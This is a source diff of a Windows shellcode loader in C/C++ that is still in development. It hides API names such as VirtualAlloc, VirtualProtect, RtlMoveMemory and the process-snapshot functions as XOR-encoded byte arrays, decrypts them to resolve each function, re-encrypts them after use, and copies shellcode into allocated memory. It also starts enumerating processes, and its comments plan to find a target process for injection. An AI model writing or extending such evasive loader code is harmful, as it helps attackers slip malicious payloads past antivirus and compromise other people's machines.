@@ -1,4 +1,5 @@
 #include <windows.h>
+#define TH32CS_SNAPPROCESS 0x00000010
 #include <stdlib.h>
 #include <stdio.h>
 #define FAVICON_ICO 
@@ -40,20 +41,47 @@ size_t shellcode_length = sizeof(shellcode);
 
 //1) XOR Decrypt
 //void XORdecrypt(unsigned char& shellcode, size_t shellcode_length, char& XORKey, size_t XORKey_length)
-void XORDecryptLPC(unsigned char encoded[], int sizeOfEncodedStr, char XORKey[], size_t XORKey_length)
+unsigned char* XORDecryptLPC(unsigned char *encoded, int sizeOfEncodedStr, char XORKey[], size_t XORKey_length)
 {
 
 	for (int it = 0; it < sizeOfEncodedStr; it++)
 	{
-		encoded[it] = (unsigned char)((encoded[it]) ^ XORKey[(it % XORKey_length)]);
+		encoded[it]= (unsigned char)((encoded[it]) ^ XORKey[(it % XORKey_length)]);
 		printf("character %d: %c \n",it, encoded[it]);
 
 	}
+	return encoded;
 
+}
+
+
+unsigned char* XOREncryptLPC(unsigned char* encoded, int sizeOfEncodedStr, char XORKey[], size_t XORKey_length)
+{
+
+	for (int it = 0; it < sizeOfEncodedStr; it++)
+	{
+		encoded[it] = XORKey[(it % XORKey_length)] ^ (unsigned char)((encoded[it]));
+
+
+	}
+	return encoded;
 
 }
 
 //3) Base64 Decrypt
+
+typedef struct tagPROCESSENTRY32 {
+	DWORD     dwSize;
+	DWORD     cntUsage;
+	DWORD     th32ProcessID;
+	ULONG_PTR th32DefaultHeapID;
+	DWORD     th32ModuleID;
+	DWORD     cntThreads;
+	DWORD     th32ParentProcessID;
+	LONG      pcPriClassBase;
+	DWORD     dwFlags;
+	CHAR      szExeFile[MAX_PATH];
+} PROCESSENTRY32;
 
 typedef LPVOID (WINAPI* functVirtualAlloc)(//function pointer
 	LPVOID lpAddress,
@@ -63,33 +91,151 @@ typedef LPVOID (WINAPI* functVirtualAlloc)(//function pointer
 
 
 typedef BOOL(WINAPI* functVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
+
+typedef VOID (WINAPI* functRtlMoveMemory)(VOID UNALIGNED* Destination, CONST VOID UNALIGNED* Source, SIZE_T Length);
+
+
+typedef HANDLE (WINAPI* functCreateToolHelp32Snapshot)(DWORD dwFlags, DWORD th32ProcessID);
+
+typedef BOOL(WINAPI* functProcess32First)(HANDLE snapshot, PROCESSENTRY32 &lpProcessEntry);
+
+typedef BOOL(WINAPI* functProcess32Next)(HANDLE snapshot, PROCESSENTRY32& lpProcessEntry); //PROCESSENTRY32& seems to be cast by windows into LPPROCESSENTRY32 (Long pointer)
+
 //This variable with store the address of virtual protect.
 
-
+unsigned char kernel[] = { 0x8, 0xb, 0x14, 0x24, 0x10, 0x25, 0x52, 0x54, 0x6a, 0x34, 0x14, 0x28 };
+unsigned char virAlloc[] = { 0x15, 0x7, 0x14, 0x3e, 0x0, 0x28, 0xd, 0x27, 0x28, 0x3c, 0x17, 0x27 };
+unsigned char virProtec[] = { 0x15, 0x7, 0x14, 0x3e, 0x0, 0x28, 0xd, 0x36, 0x36, 0x3f, 0xc, 0x21, 0xd, 0x32 };
+unsigned char rtlMoveMem[] = { 0x11, 0x1a, 0xa, 0x7, 0x1a, 0x3f, 0x4, 0x2b, 0x21, 0x3d, 0x17, 0x36, 0x17 };
+unsigned char CreateToolhelp32SnapshotFlags[] = {0x17, 0x26, 0x55, 0x78, 0x36, 0x1a, 0x3e, 0x35, 0xa, 0x11, 0x28, 0x14, 0x3c, 0x9, 0x37, 0x1, 0x0, 0x3b};
+unsigned char Process32First[] = { 0x13, 0x1c, 0x9, 0x29, 0x10, 0x3a, 0x12, 0x55, 0x76, 0x16, 0x11, 0x36, 0x1d, 0x32 };
+unsigned char CreateToolhelp32SnapshotStr[] = { 0x0, 0x1c, 0x3, 0x2b, 0x1, 0x2c, 0x35, 0x9, 0x2b, 0x3c, 0x10, 0x21, 0x2, 0x36, 0x47, 0x76, 0x0, 0x6, 0xb, 0x26, 0x38, 0x2c, 0x1f, 0x15 };
+unsigned char Process32Next[] = { 0x13, 0x1c, 0x9, 0x29, 0x10, 0x3a, 0x12, 0x55, 0x76, 0x1e, 0x1d, 0x3c, 0x1a };
 
 int main()
 {
 	bool isAllocated;
+	bool isExec;
 	//LPVOID pVirtualAlloc;
 	void* memoryBuffer;
 	functVirtualProtect pVirtualProtect;
 	functVirtualAlloc pVirtualAlloc;
-
-	pVirtualAlloc = (functVirtualAlloc)GetProcAddress(GetModuleHandle("Kernel32.dll"), "VirtualAlloc"); //point our function pointer to starting code of VirtualAlloc
-	pVirtualProtect = (functVirtualProtect)GetProcAddress(GetModuleHandle("Kernel32.dll"), "VirtualProtect"); //Why are DLL names LPCSTR, and not LPWSTR>?>?>?>?>>??>
-	//VirtualAlloc buffer that is sizeof shellcode
-	//(*pVirtualAllocFunction)
-	memoryBuffer = pVirtualAlloc(0, 40096, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-	printf("pointer to mem: %p", memoryBuffer);
-
-	unsigned char kernel[] = { 0x8, 0xb, 0x14, 0x24, 0x10, 0x25, 0x5, 0xa, 0x28 };
-
-
-	XORDecryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length);
-
-	while (4 > 2)
+	functRtlMoveMemory pRtlMoveMemory;
+	functProcess32First pProcess32First;
+	functCreateToolHelp32Snapshot pCreateToolHelp32Snapshot;
+	functProcess32Next pProcess32Next;
+	pVirtualAlloc = (functVirtualAlloc)GetProcAddress(GetModuleHandle((LPCSTR)XORDecryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length)), (LPCSTR)XORDecryptLPC(virAlloc, sizeof(virAlloc), XORKey, XORKey_length)); //point our function pointer to starting code of VirtualAlloc
+	if (pVirtualAlloc == NULL)
 	{
+		printf("pVirtualAlloc is null ptr!");
+	}
+	XOREncryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length); //reencrypt strings after our handle has been grabbed 
+	XOREncryptLPC(virAlloc, sizeof(virAlloc), XORKey, XORKey_length);
+
+
+	pVirtualProtect = (functVirtualProtect)GetProcAddress(GetModuleHandle((LPCSTR)XORDecryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length)), (LPCSTR)XORDecryptLPC(virProtec, sizeof(virProtec), XORKey, XORKey_length)); //Why are DLL names LPCSTR, and not LPWSTR>?>?>?>?>>??>
+	if (pVirtualProtect == NULL)
+	{
+		printf("pVirtualProtect is null ptr!");
+	}
+	XOREncryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length); //reencrypt strings after our handle has been grabbed 
+	XOREncryptLPC(virProtec, sizeof(virProtec), XORKey, XORKey_length);
+
+	pRtlMoveMemory = (functRtlMoveMemory)GetProcAddress(GetModuleHandle((LPCSTR)XORDecryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length)), (LPCSTR)XORDecryptLPC(rtlMoveMem, sizeof(rtlMoveMem), XORKey, XORKey_length));
+	if (pRtlMoveMemory == NULL)
+	{
+		printf("pRtlMoveMemory is null ptr!");
+	}
+	XOREncryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length); //reencrypt strings after our handle has been grabbed 
+	XOREncryptLPC(rtlMoveMem, sizeof(rtlMoveMem), XORKey, XORKey_length);
+
+
+	pProcess32First = (functProcess32First)GetProcAddress(GetModuleHandle((LPCSTR)XORDecryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length)), (LPCSTR)XORDecryptLPC(Process32First, sizeof(Process32First), XORKey, XORKey_length));
+	if (pProcess32First == NULL)
+	{
+		printf("pProcess32First is null ptr!");
+	}
+	XOREncryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length); //reencrypt strings after our handle has been grabbed 
+	XOREncryptLPC(Process32First, sizeof(Process32First), XORKey, XORKey_length);
+
+
+
+	pCreateToolHelp32Snapshot = (functCreateToolHelp32Snapshot)GetProcAddress(GetModuleHandle((LPCSTR)XORDecryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length)), (LPCSTR)XORDecryptLPC(CreateToolhelp32SnapshotStr, sizeof(CreateToolhelp32SnapshotStr), XORKey, XORKey_length));
+	if (pCreateToolHelp32Snapshot == NULL)
+	{
+		printf("pCreateToolHelp32Snapshot is null ptr!");
+	}
+	XOREncryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length); //reencrypt strings after our handle has been grabbed 
+	XOREncryptLPC(CreateToolhelp32SnapshotStr, sizeof(CreateToolhelp32SnapshotStr), XORKey, XORKey_length);
+
+	
+
+
+	pProcess32Next = (functProcess32Next)GetProcAddress(GetModuleHandle((LPCSTR)XORDecryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length)), (LPCSTR)XORDecryptLPC(Process32Next, sizeof(Process32Next), XORKey, XORKey_length));
+	if (pProcess32Next == NULL)
+	{
+		printf("pProcess32Next is null ptr!");
 
 	}
-	return -1;
-}
+	
+
+	memoryBuffer = pVirtualAlloc(0, 40096, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+	printf("HUUUUUULP \n");
+
+	printf("pointer to mem: %p", memoryBuffer);
+
+	pRtlMoveMemory(memoryBuffer, shellcode, shellcode_length);
+
+
+
+
+	HANDLE snapshot = NULL;
+	if (pCreateToolHelp32Snapshot != NULL)
+	{
+		HANDLE snapshot = pCreateToolHelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+
+	}
+	else
+	{
+		printf("FUKKKKKKKKKKKKK \n");
+	}
+
+
+
+
+
+
+		//testing
+
+		PROCESSENTRY32 test;
+		test.dwSize = sizeof(PROCESSENTRY32);
+
+		pProcess32First(snapshot, test);
+
+		//std::cout << test.th32ProcessID;
+
+
+		//1. ToolsSnapshot via indirect syscall
+		//2. Iterate over snapshot until next == null. Looking for string match with target process name. Get PID from that.
+		//Use PID to get proc handle?
+
+
+
+
+
+
+
+
+
+
+		printf("test \n\n\n");
+		int a = 0;
+		while (a  < 333)
+		{
+			a++;
+		}
+
+
+		return -1;
+	}
